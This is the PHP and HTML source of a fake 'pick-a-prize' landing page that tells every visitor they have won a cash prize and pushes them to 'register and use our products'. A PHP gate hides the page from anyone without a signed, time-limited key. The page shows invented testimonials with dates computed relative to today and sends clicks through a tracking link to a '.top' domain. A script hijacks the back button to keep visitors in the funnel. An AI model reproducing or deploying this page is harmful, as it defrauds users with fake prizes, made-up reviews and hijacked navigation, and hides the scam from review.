
<?php
    const PROTECTION_TOKEN = 'MWI1ZmJkY2ViZjNjNTg3NzlmNzVjM2M1ZDYwYzY0YWM='; // Your landing protection token
    const KEY_TTL = '30 minutes'; // How long KEY should be valid. Valid formats are explained here: http://php.net/manual/en/datetime.formats.php
    const KEY_GET_PARAM = 'key'; // GET parameter with Skro landing key.

    $key = isset($_GET[KEY_GET_PARAM]) ? rawurldecode($_GET[KEY_GET_PARAM]) : exit('Access denied');
    if (!$key = base64_decode($key)) {
        exit('Access denied');
    }
    if (!$key = json_decode($key, true)) {
        exit('Access denied');
    }
    if (!isset($key['timestamp']) || !isset($key['hash'])) {
        exit('Access denied');
    }
    $signedHash = hash_hmac('sha1', $key['timestamp'], PROTECTION_TOKEN);
    if ($signedHash !== $key['hash'] || strtotime(KEY_TTL, $key['timestamp']) < time()) {
        exit('Access denied');
    }
?>
    
<!doctype html>
<html lang="es" dir="ltr">

<head>
    <title>Congratulations!</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
    <link href="landers/pick-a-prize/assets/app.css" type="text/css" rel="stylesheet" />

</head>

<body class="theme--default">

    <main id="app" v-cloak>
        <div class="header">
            <img class="header__menu" src="landers/pick-a-prize/assets/img/menu.svg" alt="Menu">
            <img class="header__logo" src="landers/pick-a-prize/assets/img/logo/default.svg" alt="Image" />
            <img class="header__account" src="landers/pick-a-prize/assets/img/account.svg" alt="Account">
        </div>
        <div class="content">
            <div v-if="!showPrize">
                <h1 class="title title--h1">
                    🥳 Congratulations! 🥳
                </h1>
                <p class="paragraph">
                    You have the chance to win a big prize!
                </p>
                <p class="paragraph">
                    Open a box and find out what you can win⬇️
                </p>
                <prize-picker button-text="Select" button-selected-text="Ganado!" button-hover-color="#00c853" :disabled="!!selected" class="prize-picker" v-on:selected="receiveSelected">
                    <template v-slot:prize1>
              <img
                v-show="!selected"
                key="1"
                src="landers/pick-a-prize/assets/img/chest.jpg"
                class="prize-picker__image prize-picker__image--placeholder"
                alt=""
              >
              <img
                v-show="selected === 1"
                key="2"
                src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
                class="prize-picker__image"
                alt="/€2,500.00 Cash"
              />
              <img
                v-show="selected && selected !== 1"
                key="3"
                src="landers/pick-a-prize/assets/img/chest.jpg"
                class="prize-picker__image prize-picker__image--placeholder"
                alt="/€2,500.00 Cash"
              />
            </template>
                    <template v-slot:prize2>
              <img
                v-show="!selected"
                src="landers/pick-a-prize/assets/img/chest.jpg"
                class="prize-picker__image prize-picker__image--placeholder"
                alt=""
              >
              <img
                v-show="selected === 2"
                src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
                class="prize-picker__image" alt="/€2,500.00 Cash"
                alt=""
              />
              <img
                v-show="selected && selected !== 2"
                src="landers/pick-a-prize/assets/img/chest.jpg"
                class="prize-picker__image prize-picker__image--placeholder"
                alt="/€2,500.00 Cash"
              />
            </template>
                    <template v-slot:prize3>
              <img
                v-show="!selected"
                src="landers/pick-a-prize/assets/img/chest.jpg"
                class="prize-picker__image prize-picker__image--placeholder"
                alt=""
              />
              <img
                v-show="selected === 3"
                src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
                class="prize-picker__image" alt="/€2,500.00 Cash"
                alt=""
              />
              <img
                v-show="selected && selected !== 3"
                src="landers/pick-a-prize/assets/img/chest.jpg"
                class="prize-picker__image prize-picker__image--placeholder"
                alt="/€2,500.00 Cash"
              />
            </template>
                </prize-picker>
            </div>
            <div class="prize" v-else>
                <h2 class="title title--h2">You Won:</h2>
                <img class="prize__image" src="img/prizes/cash-2500-usd/nl/default@0.5x.png" alt="">
                <div class="prize__name">
                    💵 USD 2,000$  💵
                </div>
                <p class="paragraph">
                    To get the amount, complete 2 steps:
                </p>
                <p class="paragraph">
                    Step 1: Register and use our products.
                <br>Step 2: You will get bonus in three days.
                </p>
                <a href="https://skrotrack.com/click" class="prize__button" target="_blank" onclick="setTimeout(function() { window.location = 'https://nearby-massage.top'; }, 100);">Start immediately ➡️</a>
            </div>
            <div class="testimonials">
                <h2 class="testimonials__title">Hall of Fame</h2>
                <prize-comment avatar="img/profiles/latin/female/3@0.25x.jpg" name="Alba Jiménez" :date="`${DateHelper().getMonthName({ days: -1 })} ${DateHelper().getDate({ days: -1 })}, ${DateHelper().getYear({ days: -1 })}`" message="I received it today, i'm so happy!"></prize-comment>
                <prize-comment avatar="img/profiles/latin/male/3@0.25x.jpg" name="David Navarro" :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`" message="No prize for me... can I have another chance?"></prize-comment>
                <prize-comment avatar="img/profiles/latin/male/10@0.25x.jpg" name="Hugo García" :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`" message="I won!! Thanks!"></prize-comment>
                <prize-comment avatar="img/profiles/latin/female/6@0.25x.jpg" name="Paula Moreno" :date="`${DateHelper().getMonthName({ days: -3 })} ${DateHelper().getDate({ days: -3 })}, ${DateHelper().getYear({ days: -3 })}`" message="I won! Wooooooo"></prize-comment>
                <prize-comment avatar="img/profiles/latin/male/9@0.25x.jpg" name="Santiago Fernández" :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`" message="This is amazing I can't wait to play!"></prize-comment>
                <prize-comment avatar="img/profiles/latin/female/5@0.25x.jpg" name="Daniela Alonso" :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`" message="Call me a sore loser, because I really wanted it!"></prize-comment>
                <prize-comment avatar="img/profiles/latin/female/1@0.25x.jpg" name="Noa García" :date="`${DateHelper().getMonthName({ days: -6 })} ${DateHelper().getDate({ days: -6 })}, ${DateHelper().getYear({ days: -6 })}`" message="That was so easy, I won!!!!"></prize-comment>
                <prize-comment avatar="img/profiles/latin/male/2@0.25x.jpg" name="Martín Moreno" :date="`${DateHelper().getMonthName({ days: -7 })} ${DateHelper().getDate({ days: -7 })}, ${DateHelper().getYear({ days: -7 })}`" message="I've never won anything, but I hope I'm lucky!"></prize-comment>
                <prize-comment avatar="img/profiles/latin/male/6@0.25x.jpg" name="Nicolas López" :date="`${DateHelper().getMonthName({ days: -8 })} ${DateHelper().getDate({ days: -8 })}, ${DateHelper().getYear({ days: -8 })}`" message="The gift wasn't received until the next day, but it's real."></prize-comment>
                <prize-comment avatar="img/profiles/latin/male/8@0.25x.jpg" name="Juan González" :date="`${DateHelper().getMonthName({ days: -9 })} ${DateHelper().getDate({ days: -9 })}, ${DateHelper().getYear({ days: -9 })}`" message="Both my wife and I won the prize, which is really nice, haha!"></prize-comment>
            </div>
        </div>
        <div class="loader" v-show="selected && !showPrize">
            <div class="loader__dual-ring"></div>
        </div>
    </main>

    <script>
        window.view = window.view || {};
        view.datetimeTranslations = {
            "ago": ":time ago",
            "from_now": ":time from now",
            "after": ":time after",
            "before": ":time before",
            "year": "1 year|:count years",
            "month": "1 month|:count months",
            "week": "1 week|:count weeks",
            "day": "1 day|:count days",
            "hour": "1 hour|:count hours",
            "minute": "1 minute|:count minutes",
            "second": "1 second|:count seconds",
            "january": "January",
            "february": "February",
            "march": "March",
            "april": "April",
            "may": "May",
            "june": "June",
            "july": "July",
            "august": "August",
            "september": "September",
            "october": "October",
            "november": "November",
            "december": "December",
            "monday": "Monday",
            "tuesday": "Tuesday",
            "wednesday": "Wednesday",
            "thursday": "Thursday",
            "friday": "Friday",
            "saturday": "Saturday",
            "sunday": "Sunday"
        };
    </script>
    <script>
      // 当页面加载完成时，立即向history栈添加一个状态
      history.pushState(null, null, location.href);
      
      window.onpopstate = function(event) {
          // 这里处理用户点击浏览器后退按钮的情况
          // 重定向用户到指定页面, 比如 Google
          location.href = 'https://skrotrack.com/click';
          // 或者重定向用户到他们之前的页面
          // history.go(-1);
      }
  </script>
    <script type="application/javascript" src="landers/pick-a-prize/assets/app.js"></script>
</body>

</html>